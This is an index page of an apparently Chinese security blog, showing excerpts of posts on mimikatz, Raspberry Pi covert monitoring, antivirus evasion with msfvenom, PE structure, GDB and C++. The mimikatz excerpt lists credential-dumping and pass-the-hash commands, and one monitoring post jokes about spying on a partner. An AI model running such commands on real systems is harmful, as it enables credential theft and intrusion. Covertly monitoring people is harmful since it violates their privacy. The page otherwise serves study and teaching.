<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
<meta property="og:title" content="ascotbe">
<meta property="og:url" content="https://www.ascotbe.com/page/2/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.ascotbe.com/img/avatar.jpeg">
<meta property="article:author" content="ascotbe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.ascotbe.com/img/avatar.jpeg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本篇文章距最近一次更新已过去","messageNext":"天，文章内容有可能过时."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: ascotbe","link":"链接: ","source":"来源: ascotbe","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ascotbe',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2023-03-03 20:03:03'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3133731_25dh7dx5bg4.css"><link rel="stylesheet" href="/css/beating_icon.css"><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">ascotbe</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2020/04/14/Mimikatz/" title="mimikatz使用说明"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/92.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="mimikatz使用说明"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/14/Mimikatz/" title="mimikatz使用说明">mimikatz使用说明</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-14T15:07:46.000Z" title="发表于 2020-04-14 23:07:46">2020-04-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.872Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/mimikatz/">mimikatz</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

只记录自己用过的命令
常用的命令

常规抓hash

privilege::debugsekurlsa::logonpasswords 

注册列表抓hash

reg save HKLM\SYSTEM SYSTEMreg save HKLM\SAM SAMlsadump::sam /sam:SAM /system:SYSTEM

PTH登录

sekurlsa::pth /user:administrator /domain:ascotbe.com /ntlm:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXdir \\10.0.0.1\c$

procdump

有些情况下🥝是无法抓取到hash的，会提示ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)错误，可以使用procdump64+mimikatz来解决，前提是wi ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/90.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用树莓派来监听任务目标(下)"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)">利用树莓派来监听任务目标(下)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-31T14:57:46.000Z" title="发表于 2020-03-31 22:57:46">2020-03-31</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

距离上次的上篇已经过去了小半年时间了，真的不是我咕咕了，是因为自己挖的坑有点多，本片文章主要介绍的是如何对人脸进行检测和检测后的通讯方式，树莓派zeor w性能有点更不上所以我又买了4B（小声BB可能还有终篇


硬件清单


读卡器以及 SD 卡
树莓派官方摄像头一枚（夜视版
树莓派4B
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)


安装python-opencv

更新树莓派系统
在这之前记得话pip源 、apt源、系统更新源换成国内的，并且使用树莓派4并且刷入最新版的包，刷入包的哈希值
SHA-256:c9c382b659bd96b859ccb9e2ac0c2292a91a37c286ab464f2f380d451077663d
sudo apt-get updatesudo apt-get upgrade
安装python-OpenCV
在这之前还需要把系统自带的p ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/89.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows PE结构解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析">Windows PE结构解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-23T15:45:42.000Z" title="发表于 2020-03-23 23:45:42">2020-03-23</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PE/">PE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
不管你是逆向领域，还是开发领域，异或是病毒编写者（红蓝对抗），都需要对PE文件有详细的了解，由于自己是个菜逼然后需要用到修改PE结构来达到某些免杀的操作，既然这样我就祭出菜逼大杀器Google百度来自行学习，本篇文章主要都是摘抄各位师傅们的文章，加上菜逼我的理解混合在一起的，如果有哪些地方理解错了或者填错了请各位师傅斧正！！

总体介绍
可执行文件(Executable File)是指可以由操作系统直接加载执行的文件，在Windows操作系统中可执行文件就是PE文件结构，在Linux下则是ELF文件，下面这张图就是PE文件格式的图片(来自看雪)，非常大一张图片，其实PE格式就是各种结构体的结合，Windows下PE文件的各种结构体在WinNT.h这个头文件中，可以在VS（宇宙无敌第一编译器）中查询。

PE文件整体结构
PE结构可以大致分为:

DOS部分
PE文件头
节表(块表)
节数据(块数据)
调试信息

依旧用看雪 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/16/C++NamingConvention/" title="C++命名规范"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/88.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++命名规范"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/16/C++NamingConvention/" title="C++命名规范">C++命名规范</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-16T13:45:42.000Z" title="发表于 2020-03-16 21:45:42">2020-03-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/">C++命名规范</a></span></div><div class="content">前言
首先命名要可读，这是所有规则的公理！！！！！尽可能使用描述性的命名, 别心疼空间, 毕竟相比之下让代码易于新读者理解更重要. 不要用只有项目开发者能理解的缩写, 也不要通过砍掉几个字母来缩写单词。
本篇作为学习笔记，约束自己
文件命名
文件名全部都要小写并且包含下划线(_)
可接受的文件命名示例:

my_useful_class.cc
http_server_logs.h

C++ 文件要以 .cc 结尾, 头文件以 .h 结尾. 专门插入文本的文件则以 .inc 结尾
通常应尽量让文件名更加明确. http_server_logs.h 就比 logs.h 要好
类型命名
类型名称的每个单词首字母均大写, 不包含下划线: MyExcitingClass, MyExcitingEnum.
变量命名


普通变量命名
单词全小写并且用下划线(_)隔开，和文件命名类似，必须要让命名可读，并且明确。
string table_name;string user_name_read;


类数据成员
再普通的变量名前面加上c_作为开头
class TableInfo &#123;  ... ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/03/07/Basics/" title="免杀基础"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/2.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="免杀基础"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/07/Basics/" title="免杀基础">免杀基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-07T13:45:42.000Z" title="发表于 2020-03-07 21:45:42">2020-03-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Metasploit/">Metasploit</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
踩着大佬们的脚步，用自己蹩脚的C++功底复现了师傅给出的一些免杀方案。后续将给出自己的两个免杀方案，复现大佬们的这几个方案用了3天时间，我真的是菜的可怜。

生成ShellCode的方法


使用msfvenom生成的ShellCode


使用参数说明
-l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all-p, --payload         &lt;payload&gt;  要使用的有效载荷-f, --format          &lt;format&gt;   输出格式,输出的语言类型-e, --encoder         &lt;encoder&gt;  要使用的编码器- ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/33.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用树莓派来监听任务目标(上)"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)">利用树莓派来监听任务目标(上)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-21T04:57:46.000Z" title="发表于 2019-12-21 12:57:46">2019-12-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

&quot;黑客&quot;注重的是隐蔽高效的攻陷目标，那么前期的信息收集，以及踩点就是非常重要的了，如何使用树莓派来&quot;监控&quot;目标对象？
当你想知道某个地方的他在做什么？想要知道家里面是否进了小偷？
家里的那个她是否给你带了绿帽子？（写到这里我哭了出来，为什么我没有女朋友！哇~）


硬件清单


读卡器以及 SD 卡
摄像头一枚
SSH连接工具
域名一个
带公网服务器一台
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)

成品图是这样的

刷系统以及换源之类的可以看我另一篇文章，这里就不做其他概述了！

开启摄像头模块

进入配置中
sudo raspi-config
选择Interfacing Options

接着选择Camera

然后他问会问你是否同意使用pi camera，选择是重启就好了
重启后查看监控模块是否开启了，如何和乡土一样就表示没问题了 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/12/08/GDB/" title="GDB详细使用介绍"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/32.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="GDB详细使用介绍"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/08/GDB/" title="GDB详细使用介绍">GDB详细使用介绍</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-08T15:59:59.000Z" title="发表于 2019-12-08 23:59:59">2019-12-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/GDB/">GDB</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

使用GDB
启动
SH$ gdb program           # program是你的可执行文件，一般在当前目录$ gdb program core      # gdb同时调试运行程序和core文件，core是程序非法执行产生的文件$ gdb program pid       # 如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。
运行
SH(gdb) r/run             # 开始运行程序(gdb) c/continue        # 继续运行(gdb) n/next            # 下一行，不进入函数调用(gdb) s/step            # 下一行，进入函数调用(gdb) ni/si             # 吓一跳指令，ni和si区别同上(gdb) fini/ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/12/03/C++Regular/" title="C++正则规则"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/30.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++正则规则"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/03/C++Regular/" title="C++正则规则">C++正则规则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-03T15:58:53.000Z" title="发表于 2019-12-03 23:58:53">2019-12-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%AD%A3%E5%88%99/">正则</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

常用的元字符：
.： 匹配除\n之外的任何单个字符，若要匹配包括\n在内的任意字符，需使用诸如[\s\S]之类的模式；
^：匹配输入字符串的开始位置，不匹配任何字符，要匹配^字符本身，需使用\^；
$：匹配输入字符串结尾的位置，不匹配任何字符，要匹配$字符本身，需使用\$；
*： 零次或多次匹配前面的字符或子表达式，*等效于&#123;0,&#125;，如\^*b可以匹配b、^b、^^b、…；
+： 一次或多次匹配前面的字符或子表达式，等效于&#123;1,&#125;，如a+b可以匹配ab、aab、aaab、…；
?： 零次或一次匹配前面的字符或子表达式，等效于&#123;0,1&#125;，如a[cd]?可以匹配a、ac、ad； 当此字符紧随任何其他限定符*、+、?、&#123;n&#125;、&#123;n,&#125;、&#123;n,m&#125;之后时，匹配模式是非贪心的。非贪心的模式匹配搜索到的、尽可能短的字符串， ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/11/21/TheDifferenceBetweenC++NewAndMalloc/" title="c++ new和malloc的区别"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/99.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="c++ new和malloc的区别"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/21/TheDifferenceBetweenC++NewAndMalloc/" title="c++ new和malloc的区别">c++ new和malloc的区别</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-21T13:45:12.000Z" title="发表于 2019-11-21 21:45:12">2019-11-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

1. 申请的内存所在位置
new操作符从自由存储区（free store）上为对象动态分配内存空间，而malloc函数从堆上动态分配内存。自由存储区是C++基于new操作符的一个抽象概念，凡是通过new操作符进行内存申请，该内存即为自由存储区。而堆是操作系统中的术语，是操作系统所维护的一块特殊内存，用于程序的内存动态分配，C语言使用malloc从堆上分配内存，使用free释放已分配的对应内存。
那么自由存储区是否能够是堆（问题等价于new是否能在堆上动态分配内存），这取决于operator new 的实现细节。自由存储区不仅可以是堆，还可以是静态存储区，这都看operator new在哪里为对象分配内存。
特别的，new甚至可以不为对象分配内存！定位new的功能可以办到这一点：
new (place_address) type
place_address为一个指针，代表一块内存的地址。当使用上面这种仅以一个地址调用new操作符时 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/11/14/C++GetInstalledProgramNotes/" title="C++ 获取已安装程序笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/28.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++ 获取已安装程序笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/14/C++GetInstalledProgramNotes/" title="C++ 获取已安装程序笔记">C++ 获取已安装程序笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-14T13:45:12.000Z" title="发表于 2019-11-14 21:45:12">2019-11-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">在Windows系统中，已安装软件的信息都保存在注册表中
那种绿色免安装包还不知道怎么获取
32位系统存在以下两个位置：
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\UninstallHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
64位系统在32位系统上多出一处，也就是WOW6432Node的节点下
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
如何区分哪个是补丁哪个是安装程序
